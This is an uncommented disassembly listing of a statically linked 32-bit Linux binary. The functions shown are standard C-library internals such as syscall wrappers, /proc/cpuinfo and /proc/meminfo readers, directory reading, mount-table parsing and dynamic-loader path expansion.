mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x40
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
xor eax, eax
jmp 0x8078ee4
mov eax, dword [0x80aac44]
push ebp
mov edx, 0x64
mov ebp, esp
leave
test eax, eax
cmove eax, edx
ret
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [var_8h]
mov dword [esp], 7
mov dword [var_4h], eax
call fcn.08090180
mov edx, eax
mov eax, 0x100
test edx, edx
cmovns eax, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80aad50]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
test eax, eax
jle 0x8090200
mov ecx, esi
mov eax, 0x4c
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80901ed
cmp ebx, 0xffffffff
mov eax, 0xffffffff
je 0x80901cf
cmp dword [esi], 0x7fffffff
je 0x80901e5
cmp dword [esi + 4], 0x7fffffff
je 0x80901dc
mov eax, ebx
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov dword [esi + 4], 0xffffffff
jmp 0x80901cd
mov dword [esi], 0xffffffff
jmp 0x80901c4
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x80901b2
lea esi, [esi]
mov ecx, esi
mov eax, 0xbf
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x809023e
cmp edi, 0xffffffff
je 0x8090225
mov eax, edi
mov dword [0x80aad50], 0xffffffff
jmp 0x80901cf
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x8090217
mov dword [0x80aad50], 1
jmp 0x80901a0
neg edi
call fcn.08048b20
mov dword [eax], edi
mov edi, 0xffffffff
jmp 0x8090212
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x808defb
mov dword [esp], 0x80aaa6c
call section.
xor eax, eax
call fcn.0808df20
mov eax, 0
test eax, eax
je 0x808df17
mov dword [esp], 0x80aaa6c
call section.
mov eax, dword [0x80aad44]
leave
ret
push ebp
mov edx, 0x2000
mov ebp, esp
push edi
push esi
lea eax, [ebp - 0x200c]
push ebx
sub esp, 0x2010
mov dword [ebp - 0x2010], 1
call fcn.0807a840
test eax, eax
mov esi, eax
je 0x807aa26
mov dword [esp], eax
call fcn.08053400
add eax, 0x1b
and eax, 0xfffffffc
sub esp, eax
lea edi, [arg_1bh]
mov dword [var_4h], esi
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.080773c0
mov dword [eax], 0x6174732f
mov word [eax + 4], 0x74
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa34
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov edi, 0x80a35a1
mov ecx, 3
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a9c3
movsx eax, byte [ebp - 0x2009]
mov edx, dword [ebp - 0x2010]
sub eax, 0x30
cmp eax, 9
setbe al
inc edx
test al, 1
cmove edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807a9c3
mov dword [esp], ebx
call fcn.08049dc0
mov eax, dword [ebp - 0x2010]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.080773c0
mov dword [esp], eax
mov dword [var_8h], 9
mov dword [var_4h], str._cpuinfo
call fcn.08053740
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa26
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov ecx, 9
mov edi, str.processor
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
mov edx, dword [ebp - 0x2010]
seta cl
setb al
inc edx
cmp cl, al
cmovne edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807aa88
push ebp
mov eax, str.MemTotal:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
mov esi, esi
push ebp
mov eax, str.MemFree:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
nop
nop
mov eax, dword [0x80aac44]
push ebp
mov edx, 0x64
mov ebp, esp
leave
test eax, eax
cmove eax, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
mov edi, dword [arg_8h]
je 0x807ad3b
mov dword [esp], 3
call section.
mov eax, dword [eax]
xor esi, esi
mov ebx, dword [eax + 0x50]
cmp byte [ebx], 0
je 0x807ad32
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x807ad36
mov dword [esp], ebx
mov dword [var_4h], 0
inc esi
call fcn.080537a0
cmp byte [eax + 1], 0
lea ebx, [eax + 1]
jne 0x807acb5
xor eax, eax
test al, al
je 0x807ad32
mov eax, 0
test eax, eax
je 0x807ad2b
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x6c]
mov eax, 0
add ebx, esi
test eax, eax
je 0x807ad24
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + ebx*4 + 0x24]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x807ad16
mov eax, dword [0x80a9ab4]
jmp 0x807acfa
xor eax, eax
jmp 0x807ad1c
movzx eax, byte [ebx]
jmp 0x807ace1
mov eax, dword [0x80a9ab4]
jmp 0x807aca5
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, str.MemFree:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x55
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0xbc
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
cmp edi, 1
je 0x8090118
mov eax, dword [0x80aad2c]
test eax, eax
jne 0x8090080
lea esi, [var_ach]
mov ebx, dword [arg_ch]
mov ecx, esi
mov eax, 0xc4
int 0x80
cmp eax, 0xfffff000
mov dword [var_b0h], eax
ja 0x80900f6
mov ebx, dword [var_b0h]
test ebx, ebx
je 0x80900dc
cmp ebx, 0xffffffff
je 0x809006a
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
call fcn.08048b20
cmp dword [eax], 0x26
jne 0x809005d
mov dword [0x80aad2c], 1
mov esi, esi
lea esi, [var_4ch]
mov ebx, dword [arg_ch]
mov ecx, esi
mov eax, 0x6b
int 0x80
cmp eax, 0xfffff000
mov dword [var_b0h], eax
ja 0x80900bd
mov ebx, dword [var_b0h]
test ebx, ebx
jne 0x809005d
mov ecx, dword [arg_10h]
mov dword [var_sp_4h], esi
mov dword [esp], edi
mov dword [var_sp_8h], ecx
call fcn.08054300
mov ebx, eax
jmp 0x809005d
call fcn.08048b20
neg dword [var_b0h]
mov edx, dword [var_b0h]
mov dword [var_b0h], 0xffffffff
mov dword [eax], edx
jmp 0x809009c
mov ecx, dword [arg_10h]
mov dword [var_sp_4h], esi
mov dword [esp], edi
mov dword [var_sp_8h], ecx
call fcn.08054500
mov ebx, eax
jmp 0x8090058
call fcn.08048b20
neg dword [var_b0h]
mov edx, dword [var_b0h]
mov dword [var_b0h], 0xffffffff
mov dword [eax], edx
jmp 0x809004a
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov eax, 0x6b
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x8090135
mov eax, esi
jmp 0x809005f
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x809012e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x70
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
je 0x808fb4f
mov eax, dword [0x80aab0c]
test eax, eax
je 0x808fb40
test eax, eax
js 0x808fb00
mov ecx, 0x18800
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x808faed
xor edx, edx
test esi, esi
js 0x808fab4
lea eax, [var_6ch]
mov dword [var_4h], esi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
js 0x808fac0
mov eax, dword [0x80aab0c]
test eax, eax
jle 0x808fad8
mov dword [var_8h], 1
mov dword [var_4h], 2
mov dword [esp], esi
call fcn.08054250
test eax, eax
js 0x808fac0
mov eax, dword [var_38h]
mov dword [var_70h], 0x2000
cmp eax, 0x114
cmovb eax, dword [var_70h]
mov dword [var_70h], eax
add eax, 0x30
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x808fac0
xor eax, eax
mov ecx, 0xc
mov edi, ebx
cld
rep stosd dword es:[edi], eax
lea eax, [ebx + 0x30]
mov dword [ebx], esi
mov dword [ebx + 4], eax
mov eax, dword [var_70h]
mov dword [ebx + 8], eax
mov eax, 0
test eax, eax
je 0x808fab2
lea eax, [ebx + 0x18]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
mov edx, ebx
add esp, 0x70
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
call fcn.08048b20
mov ebx, esi
mov edi, eax
mov edx, dword [eax]
mov eax, 6
int 0x80
mov dword [edi], edx
xor edx, edx
jmp 0x808fab4
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x808fa39
jmp 0x808fac0
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x808fa03
lea eax, [var_6ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08079600
xor edx, edx
test eax, eax
js 0x808fab4
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x808f9ea
call fcn.08048b20
mov dword [eax], 0x14
jmp 0x808fad4
lea esi, [esi]
call fcn.0808f940
mov eax, dword [0x80aab0c]
jmp 0x808f9e2
call fcn.08048b20
mov dword [eax], 2
jmp 0x808fad4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov esi, dword [arg_8h]
call fcn.08048b20
mov edi, dword [eax]
mov eax, 0
test eax, eax
je 0x808fc27
lea eax, [esi + 0x18]
mov dword [esp], eax
call section.
mov edx, dword [esi + 4]
lea esi, [esi]
mov ecx, dword [esi + 0x10]
cmp ecx, dword [esi + 0xc]
jae 0x808fc6f
lea ebx, [ecx + edx]
movzx eax, word [ebx + 8]
lea eax, [eax + ecx]
mov dword [esi + 0x10], eax
mov eax, dword [ebx + 4]
mov dword [esi + 0x14], eax
mov eax, dword [ebx]
test eax, eax
je 0x808fc30
mov eax, 0
test eax, eax
je 0x808fc65
lea eax, [esi + 0x18]
mov dword [esp], eax
call section.
add esp, 4
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [esi + 8]
mov eax, dword [esi]
call fcn.0808fcc0
test eax, eax
mov ebx, eax
jle 0x808fc90
mov dword [esi + 0xc], eax
mov dword [esi + 0x10], 0
xor ecx, ecx
mov edx, dword [esi + 4]
jmp 0x808fc38
jl 0x808fca1
test ebx, ebx
jne 0x808fc9d
call fcn.08048b20
mov dword [eax], edi
xor ebx, ebx
jmp 0x808fc51
call fcn.08048b20
cmp dword [eax], 2
mov eax, 0
cmove ebx, eax
jmp 0x808fc92
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_ch]
mov eax, ebx
sub eax, edx
lea ecx, [eax - 1]
movzx eax, byte [edx]
inc edx
test al, al
mov byte [ecx + edx], al
jne 0x808dca1
mov eax, ebx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x808fbbd
mov eax, 0
mov esi, dword [ebx]
test eax, eax
je 0x808fb89
lea eax, [ebx + 0x18]
mov dword [esp], eax
call section.
mov dword [esp], ebx
mov ebx, esi
call fcn.08051180
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x808fbad
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x808fba3
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x808fba5
push ebp
mov ebp, esp
sub esp, 0xc
cmp dword [arg_1ch], 1
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
mov ebx, dword [arg_ch]
mov ecx, dword [eax]
je 0x807a180
mov eax, dword [ecx + 8]
test eax, eax
je 0x807a132
mov edx, dword [ecx + 4]
test edx, edx
je 0x807a132
test byte [eax + 0xc], 1
je 0x807a132
test byte [edx + 0xc], 1
je 0x807a132
or byte [ecx + 0xc], 1
test eax, eax
je 0x807a0d1
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 4]
test eax, eax
je 0x807a0dc
and byte [eax + 0xc], 0xfe
test ebx, ebx
je 0x807a132
mov esi, dword [ebx]
movzx ebx, byte [esi + 0xc]
test bl, 1
je 0x807a132
mov eax, dword [arg_10h]
mov edi, dword [eax]
mov eax, dword [arg_14h]
test eax, eax
mov eax, dword [arg_18h]
setg dl
test eax, eax
setg al
xor eax, edx
test al, 1
je 0x807a153
or ebx, 1
mov byte [esi + 0xc], bl
or byte [edi + 0xc], 1
and byte [ecx + 0xc], 0xfe
mov edx, dword [arg_14h]
test edx, edx
js 0x807a13f
mov eax, dword [ecx + 4]
mov dword [esi + 8], eax
mov eax, dword [ecx + 8]
mov dword [ecx + 4], esi
mov dword [edi + 4], eax
mov dword [ecx + 8], edi
mov eax, dword [arg_10h]
mov dword [eax], ecx
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov eax, dword [ecx + 8]
mov dword [esi + 4], eax
mov eax, dword [ecx + 4]
mov dword [ecx + 8], esi
mov dword [edi + 8], eax
mov dword [ecx + 4], edi
jmp 0x807a12d
mov eax, dword [arg_10h]
mov dword [eax], esi
and byte [esi + 0xc], 0xfe
or byte [edi + 0xc], 1
mov eax, dword [arg_14h]
test eax, eax
js 0x807a172
mov eax, dword [esi + 4]
mov dword [esi + 4], edi
mov dword [edi + 8], eax
jmp 0x807a132
mov eax, dword [esi + 8]
mov dword [esi + 8], edi
mov dword [edi + 4], eax
jmp 0x807a132
lea esi, [esi]
mov eax, dword [ecx + 8]
jmp 0x807a0c5
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, eax
mov eax, dword [eax + 4]
mov esi, edx
test eax, eax
jne 0x807a7de
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a7d5
mov eax, dword [ebx]
mov dword [esp], eax
call esi
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov edx, esi
call fcn.0807a7a0
jmp 0x807a7be
call fcn.0807a7a0
jmp 0x807a7b7
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_ch]
mov edi, esp
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 0x14]
and edx, 0xfffffffc
sub esp, edx
lea ebx, [var_1bh]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], esi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov word [eax], 0x63
mov dword [var_sp_4h], ebx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x80902e5
mov dword [var_sp_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov eax, ebx
mov esp, edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x414
mov ebx, dword [arg_10h]
mov edi, dword [arg_8h]
cmp word [edi], 0
jns 0x809070e
lea esi, [esi]
mov eax, dword [arg_14h]
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08076c40
test eax, eax
je 0x80906f7
mov dword [var_4h], 0xa
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x80906bc
mov byte [eax], 0
movsx eax, byte [ebx]
xor edx, edx
cmp eax, 0x20
je 0x80906a8
cmp eax, 9
je 0x80906a8
lea ecx, [edx + ebx]
mov dword [var_410h], ecx
mov edx, ecx
movzx eax, byte [ecx]
test al, al
je 0x80903f0
cmp al, 0x23
je 0x80903f0
test ecx, ecx
lea esi, [var_410h]
je 0x8090481
movzx eax, byte [edx]
test al, al
je 0x80906a1
cmp al, 0x20
je 0x8090473
cmp al, 9
je 0x8090473
inc edx
jmp 0x809045d
mov byte [edx], 0
inc edx
mov dword [esi], edx
test ecx, ecx
jne 0x8090694
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x80904e1
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x8090680
cmp eax, 9
je 0x8090680
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x80904e1
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090678
cmp al, 0x20
je 0x80904d3
cmp al, 9
je 0x80904d3
inc ecx
jmp 0x80904bd
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x809066b
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 4], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x8090542
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x8090657
cmp eax, 9
je 0x8090657
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x8090542
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090650
cmp al, 0x20
je 0x8090534
cmp al, 9
je 0x8090534
inc ecx
jmp 0x809051e
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x8090643
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 8], eax
mov edx, dword [var_410h]
test edx, edx
mov ebx, edx
je 0x809059f
movsx eax, byte [edx]
xor ecx, ecx
cmp eax, 0x20
je 0x809062f
cmp eax, 9
je 0x809062f
lea edx, [ecx + ebx]
test edx, edx
mov dword [var_410h], edx
je 0x809059f
mov ecx, edx
movzx eax, byte [ecx]
test al, al
je 0x8090628
cmp al, 0x20
je 0x8090595
cmp al, 9
je 0x8090595
inc ecx
jmp 0x809057f
mov byte [ecx], 0
inc ecx
mov dword [esi], ecx
test edx, edx
jne 0x809061b
mov eax, 0x80a4f11
mov edx, dword [arg_ch]
mov dword [edx + 0xc], eax
xor eax, eax
mov edx, dword [var_410h]
test edx, edx
jne 0x80905f5
cmp eax, 1
je 0x80905e9
jle 0x80905db
cmp word [edi], 0
jns 0x80905d1
mov eax, dword [arg_ch]
add esp, 0x414
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edi
call fcn.08074580
jmp 0x80905c3
test eax, eax
jne 0x80905bd
mov eax, dword [arg_ch]
mov dword [eax + 0x10], 0
mov edx, dword [arg_ch]
mov dword [edx + 0x14], 0
jmp 0x80905bd
mov eax, dword [arg_ch]
mov dword [var_4h], str.__d__d_
mov dword [esp], edx
add eax, 0x14
mov dword [var_ch], eax
mov eax, dword [arg_ch]
add eax, 0x10
mov dword [var_8h], eax
call fcn.08049be0
jmp 0x80905b6
mov dword [esp], edx
call fcn.08090320
jmp 0x80905a4
xor ecx, ecx
jmp 0x8090599
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x809062f
cmp eax, 9
je 0x809062f
jmp 0x8090570
mov dword [esp], edx
call fcn.08090320
jmp 0x8090547
xor ecx, ecx
jmp 0x8090538
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x8090657
cmp eax, 9
je 0x8090657
jmp 0x809050f
mov dword [esp], edx
call fcn.08090320
jmp 0x80904e6
xor ecx, ecx
jmp 0x80904d7
nop
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x8090680
cmp eax, 9
je 0x8090680
jmp 0x80904ae
mov dword [esp], ecx
call fcn.08090320
jmp 0x8090486
xor edx, edx
jmp 0x8090477
inc edx
movsx eax, byte [edx + ebx]
cmp eax, 0x20
je 0x80906a8
cmp eax, 9
je 0x80906a8
jmp 0x809043d
lea esi, [var_40ch]
mov dword [var_8h], edi
mov dword [var_4h], 0x400
mov dword [esp], esi
call fcn.08076c40
test eax, eax
je 0x8090426
mov dword [var_4h], 0xa
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
je 0x80906c2
jmp 0x8090426
cmp word [edi], 0
jns 0x8090704
xor eax, eax
jmp 0x80905c6
mov dword [esp], edi
call fcn.08074580
jmp 0x80906fd
mov dword [esp], edi
call fcn.08074540
jmp 0x80903f0
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
test eax, eax
je 0x8090315
mov dword [esp], eax
call fcn.08049dc0
mov eax, 1
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov dword [var_38h], 0
mov dword [var_34h], edx
mov dword [var_30h], eax
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_mtab
call fcn.08090280
test eax, eax
mov ebx, eax
je 0x807a90c
mov dword [var_4h], 2
mov dword [esp], ebx
call fcn.08076c00
mov eax, dword [var_34h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov eax, dword [var_30h]
mov dword [var_8h], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
call fcn.080903d0
test eax, eax
je 0x807a8bd
mov esi, dword [var_24h]
mov edi, str.proc
mov ecx, 5
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a884
mov eax, dword [var_28h]
mov dword [var_38h], eax
mov dword [esp], ebx
call fcn.08090300
mov eax, dword [var_38h]
test eax, eax
je 0x807a905
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08076e80
mov edx, eax
mov eax, dword [var_38h]
test edx, edx
je 0x807a8f3
xor eax, eax
lock cmpxchg dword [0x80aad98], edx
test eax, eax
jne 0x807a8fb
mov eax, dword [0x80aad98]
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edx
call fcn.08051180
jmp 0x807a8ee
mov eax, str._proc
jmp 0x807a8f3
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_fstab
call fcn.08090280
test eax, eax
mov ebx, eax
jne 0x807a874
jmp 0x807a905
push ebp
mov ebp, esp
push edi
xor edi, edi
mov ecx, dword [arg_ch]
push esi
mov esi, dword [arg_10h]
push ebx
movzx eax, byte [ecx]
cmp al, 0x7b
je 0x807aea0
xor ebx, ebx
cmp al, byte [esi]
je 0x807ae88
movzx edx, byte [ecx]
mov eax, edi
test al, al
je 0x807ae71
xor eax, eax
cmp dl, 0x7d
je 0x807ae34
pop ebx
pop esi
pop edi
leave
ret
dec ecx
add ebx, 2
mov esi, dword [arg_18h]
test esi, esi
jne 0x807ae43
mov eax, ebx
jmp 0x807ae2f
movzx eax, byte [ebx + ecx]
test al, al
je 0x807ae5a
mov edx, dword [arg_14h]
test edx, edx
je 0x807ae56
cmp al, 0x3a
je 0x807ae5a
xor eax, eax
jmp 0x807ae2f
mov eax, dword [arg_8h]
inc eax
cmp ecx, eax
je 0x807ae3f
mov eax, dword [arg_14h]
test eax, eax
je 0x807ae56
cmp byte [ecx - 2], 0x3a
jne 0x807ae56
jmp 0x807ae3f
test dl, dl
je 0x807ae38
cmp dl, 0x2f
je 0x807ae38
mov edi, dword [arg_14h]
test edi, edi
je 0x807ae56
cmp dl, 0x3a
jne 0x807ae56
jmp 0x807ae38
test al, al
je 0x807ae1f
lea esi, [esi]
inc ebx
movzx edx, byte [ebx + ecx]
cmp dl, byte [ebx + esi]
jne 0x807ae22
test dl, dl
jne 0x807ae90
jmp 0x807ae22
inc ecx
mov edi, 1
movzx eax, byte [ecx]
jmp 0x807ae19
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov ecx, dword [arg_ch]
mov esi, dword [arg_8h]
mov ebx, dword [esi]
test ebx, ebx
je 0x808de12
movzx edx, byte [ecx]
test dl, dl
je 0x808de1a
cmp byte [ecx + 1], 0
jne 0x808de22
movzx ecx, byte [ebx]
mov eax, ebx
cmp cl, dl
je 0x808de06
test cl, cl
je 0x808de1a
movsx eax, dl
lea edx, [ebx + 1]
mov dword [var_sp_4h], eax
mov dword [esp], edx
call fcn.08076ce0
test eax, eax
je 0x808de1a
mov byte [eax], 0
inc eax
mov dword [esi], eax
mov eax, ebx
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [esi], 0
jmp 0x808de10
mov dword [var_sp_4h], ecx
mov dword [esp], ebx
call fcn.08090e20
jmp 0x808de06
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_8h], esi
mov dword [var_4h], 0x24
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_bp_4h], edi
xor ebx, ebx
mov edi, dword [arg_8h]
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
jne 0x807b1c3
test ebx, ebx
jne 0x807b12b
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807b11e
mov dword [var_sp_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [esp], esi
call fcn.08053400
mov dword [var_10h], eax
mov eax, dword [edi + 0x190]
test eax, eax
jne 0x807b1b2
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807b1da
call fcn.08083280
test eax, eax
mov dword [edi + 0x190], eax
je 0x807b1ae
cmp eax, 0xffffffff
je 0x807b1ae
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
mov edx, dword [var_10h]
sub eax, 7
imul ebx, eax
lea eax, [ebx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807b120
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], edx
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.0807af60
jmp 0x807b120
xor edx, edx
jmp 0x807b16a
xor edx, edx
cmp eax, 0xffffffff
je 0x807b16a
mov dword [esp], eax
call fcn.08053400
jmp 0x807b168
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.0807aeb0
mov ebx, eax
jmp 0x807b0ef
mov dword [var_sp_ch], str.expand_dynamic_string_token
mov dword [var_sp_8h], 0x13d
mov dword [var_4h], str.dl_load.c
mov dword [esp], str._l___l_name_0___0
call fcn.0805efc0
mov esi, esi
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x24
mov eax, dword [ecx + 4]
mov dword [var_10h_5], edx
mov dword [var_14h_2], eax
mov eax, dword [0x80aac70]
test eax, eax
jne 0x807b60b
mov eax, dword [var_10h_5]
mov dword [esp], ecx
mov dword [var_4h_4], eax
call fcn.0807b0c0
mov esi, eax
mov eax, str.cannot_create_RUNPATH_RPATH_copy
test esi, esi
je 0x807b5fa
movzx eax, byte [esi]
xor ebx, ebx
mov ecx, esi
test al, al
je 0x807b59b
mov edx, eax
cmp dl, 0x3a
lea eax, [ebx + 1]
cmove ebx, eax
inc ecx
movzx eax, byte [ecx]
test al, al
mov edx, eax
jne 0x807b588
lea eax, [ebx*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b5f5
mov edx, dword [var_14h_2]
mov eax, dword [var_4h_3]
mov dword [esp + 0xc], 0
mov dword [esp + 8], 0x80a36b1
mov dword [var_4h_4], ebx
mov dword [esp], esi
